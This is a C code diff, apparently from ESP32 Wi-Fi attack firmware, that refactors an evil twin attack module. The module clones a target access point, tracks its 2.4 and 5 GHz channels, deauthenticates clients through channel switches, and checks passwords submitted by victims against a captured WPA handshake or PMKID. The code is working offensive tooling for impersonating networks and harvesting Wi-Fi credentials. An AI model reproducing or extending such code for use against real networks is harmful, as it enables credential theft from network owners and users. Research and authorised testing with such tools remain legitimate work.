@@ -28,6 +28,9 @@ static const char* evil_twin_attack_status_string[EVIL_TWIN_ATTACK_STATUS_MAX] =
 /* Evil Twin Status Information */
 static evil_twin_attack_status_info_t evil_twin_status = { 0 };
 
+/* AP info copy */
+static aps_info_t aps = {0};
+
 
 static void evil_twin_task(void *pvParameters) 
 {
@@ -61,36 +64,33 @@ static void evil_twin_task(void *pvParameters)
     /* Wait AP to be cloned */
     vTaskDelay(pdMS_TO_TICKS(2000));
     /* Start sniffer and beacon tracking */
-    wifi_start_sniffing(target, SNIFF_MODE_ATTACK_EVIL_TWIN);
+    wifi_sniffer_set_bssid_filter(target->bssid);
+    wifi_start_sniffing();
 
     /* NOTE: wifi_sniffer_scan_fill_aps utilize a mutex initialized with wifi_start_sniffing*/
     /* Try to find 5ghz twin AP */
     if(wifi_sniffer_scan_fill_aps() == ESP_OK) {
-        aps_info_t *aps = malloc(sizeof(aps_info_t));
-        if(aps) {
-            if(wifi_sniffer_get_aps(aps) == ESP_OK) {
-                /* Search in scanned aps */
-                for(uint8_t i = 0; i < aps->count; i++) {
-                    /* Found same AP on 5ghz */
-                    if( (aps->ap[i].primary > 14) && (strcmp((char *)aps->ap[i].ssid, (char *)target->ssid) == 0) ) {
-                        twin_on_5ghz.attack_scheme = target->attack_scheme;
-                        twin_on_5ghz.authmode = aps->ap[i].authmode;
-                        twin_on_5ghz.channel = aps->ap[i].primary;
-                        twin_on_5ghz.group_cipher = aps->ap[i].group_cipher;
-                        twin_on_5ghz.pairwise_cipher = aps->ap[i].pairwise_cipher;
-                        twin_on_5ghz.rssi = aps->ap[i].rssi;
-                        twin_on_5ghz.vendor = target->vendor;
-                        memcpy(twin_on_5ghz.ssid, aps->ap[i].ssid, sizeof(aps->ap[i].ssid));
-                        memcpy(twin_on_5ghz.bssid, aps->ap[i].bssid, sizeof(aps->ap[i].bssid));
-                        target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
-                        evil_twin_status.has_5ghz_target = true;
-                        ESP_LOGI(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
-                        ws_log(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
-                        break;
-                    }
+        if(wifi_sniffer_get_aps(&aps) == ESP_OK) {
+            /* Search in scanned aps */
+            for(uint8_t i = 0; i < aps.count; i++) {
+                /* Found same AP on 5ghz */
+                if( (aps.ap[i].primary > 14) && (strcmp((char *)aps.ap[i].ssid, (char *)target->ssid) == 0) ) {
+                    twin_on_5ghz.attack_scheme = target->attack_scheme;
+                    twin_on_5ghz.authmode = aps.ap[i].authmode;
+                    twin_on_5ghz.channel = aps.ap[i].primary;
+                    twin_on_5ghz.group_cipher = aps.ap[i].group_cipher;
+                    twin_on_5ghz.pairwise_cipher = aps.ap[i].pairwise_cipher;
+                    twin_on_5ghz.rssi = aps.ap[i].rssi;
+                    twin_on_5ghz.vendor = target->vendor;
+                    memcpy(twin_on_5ghz.ssid, aps.ap[i].ssid, sizeof(aps.ap[i].ssid));
+                    memcpy(twin_on_5ghz.bssid, aps.ap[i].bssid, sizeof(aps.ap[i].bssid));
+                    target_set(&twin_on_5ghz, TARGET_INFO_EVIL_TWIN_5G);
+                    evil_twin_status.has_5ghz_target = true;
+                    ESP_LOGI(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
+                    ws_log(TAG, "Found twin target on 5GHz (Ch: %d).", twin_on_5ghz.channel);
+                    break;
                 }
             }
-            free(aps);
         }
     }
 
@@ -143,42 +143,37 @@ static void evil_twin_task(void *pvParameters)
         if (esp_timer_get_time() - last_scan_time > SCAN_INTERVAL_US) 
         {
             if(wifi_sniffer_scan_fill_aps() == ESP_OK) {
-                aps_info_t *aps = malloc(sizeof(aps_info_t));
-                if(aps) {
-                    if(wifi_sniffer_get_aps(aps) == ESP_OK) {
-                        bool found_2g_now = false;
-
-                        for(uint8_t i = 0; i < aps->count; i++) {
-                            if (strcmp((char *)aps->ap[i].ssid, (char *)target->ssid) == 0) 
-                            {
-                                if (aps->ap[i].primary <= 14) {
-                                    found_2g_now = true;
-                                    if (target->channel != aps->ap[i].primary) {
-                                        ESP_LOGW(TAG, "TARGET 2.4GHz SWITCHED CHANNEL: %d -> %d", target->channel, aps->ap[i].primary);
-                                        ws_log(TAG, "Target 2.4GHz moved to Ch %d", aps->ap[i].primary);
-                                        target->channel = aps->ap[i].primary;
-                                        memcpy(target->bssid, aps->ap[i].bssid, 6);
-                                        /* This will cause current STA to disconnect */
-                                        wifi_set_channel_safe(target->channel);
-                                    }
+                if(wifi_sniffer_get_aps(&aps) == ESP_OK) {
+                    bool found_2g_now = false;
+                    for(uint8_t i = 0; i < aps.count; i++) {
+                        if (strcmp((char *)aps.ap[i].ssid, (char *)target->ssid) == 0) 
+                        {
+                            if (aps.ap[i].primary <= 14) {
+                                found_2g_now = true;
+                                if (target->channel != aps.ap[i].primary) {
+                                    ESP_LOGW(TAG, "TARGET 2.4GHz SWITCHED CHANNEL: %d -> %d", target->channel, aps.ap[i].primary);
+                                    ws_log(TAG, "Target 2.4GHz moved to Ch %d", aps.ap[i].primary);
+                                    target->channel = aps.ap[i].primary;
+                                    memcpy(target->bssid, aps.ap[i].bssid, 6);
+                                    /* This will cause current STA to disconnect */
+                                    wifi_set_channel_safe(target->channel);
                                 }
-                                else {
-                                    if (!evil_twin_status.has_5ghz_target) {
-                                        evil_twin_status.has_5ghz_target = true;
-                                        ESP_LOGI(TAG, "New 5GHz target found on Ch %d", aps->ap[i].primary);
-                                    }
-                                    if (twin_on_5ghz.channel != aps->ap[i].primary) {
-                                        ESP_LOGW(TAG, "TARGET 5GHz SWITCHED CHANNEL: %d -> %d", twin_on_5ghz.channel, aps->ap[i].primary);
-                                        ws_log(TAG, "Target 5GHz moved to Ch %d", aps->ap[i].primary);
-                                        twin_on_5ghz.channel = aps->ap[i].primary;
-                                        memcpy(twin_on_5ghz.bssid, aps->ap[i].bssid, 6);
-                                    }
+                            }
+                            else {
+                                if (!evil_twin_status.has_5ghz_target) {
+                                    evil_twin_status.has_5ghz_target = true;
+                                    ESP_LOGI(TAG, "New 5GHz target found on Ch %d", aps.ap[i].primary);
+                                }
+                                if (twin_on_5ghz.channel != aps.ap[i].primary) {
+                                    ESP_LOGW(TAG, "TARGET 5GHz SWITCHED CHANNEL: %d -> %d", twin_on_5ghz.channel, aps.ap[i].primary);
+                                    ws_log(TAG, "Target 5GHz moved to Ch %d", aps.ap[i].primary);
+                                    twin_on_5ghz.channel = aps.ap[i].primary;
+                                    memcpy(twin_on_5ghz.bssid, aps.ap[i].bssid, 6);
                                 }
                             }
                         }
-                        if(!found_2g_now) ESP_LOGW(TAG, "Lost track of 2.4GHz target in this scan.");
                     }
-                    free(aps);
+                    if(!found_2g_now) ESP_LOGW(TAG, "Lost track of 2.4GHz target in this scan.");
                 }
             }
             last_scan_time = esp_timer_get_time();
@@ -224,8 +219,7 @@ void evil_twin_stop_attack(void)
     /* Kill task */
     vTaskDelete(evil_twin_task_handle);
     evil_twin_task_handle = NULL;
-    /* Stop sniffer and beacon tracking */
-    wifi_stop_beacon_tracking();
+    /* Stop sniffer */
     wifi_stop_sniffing();
     /* Wait engine stop */
     vTaskDelay(pdMS_TO_TICKS(1000));
@@ -239,16 +233,18 @@ void evil_twin_stop_attack(void)
 
 bool evil_twin_check_password(char *password)
 {
-    const handshake_info_t *handshake = wifi_sniffer_get_handshake();
+    handshake_info_t handshake = {0};
     const target_info_t target = *target_get(TARGET_INFO_EVIL_TWIN);
+    
+    if(wifi_sniffer_get_handshake_for_target(target.bssid, NULL, &handshake) != ESP_OK) return false;
 
-    if( handshake->handshake_captured)
+    if( handshake.handshake_captured)
     {
-        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic, handshake->key_decriptor_version);
+        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake.mac_sta, handshake.anonce, handshake.snonce, handshake.eapol, handshake.eapol_len, handshake.mic, handshake.key_decriptor_version);
     }
-    if( handshake->pmkid_captured)
+    if( handshake.pmkid_captured)
     {
-        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
+        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake.mac_sta, handshake.pmkid);
     }
     
     return false;
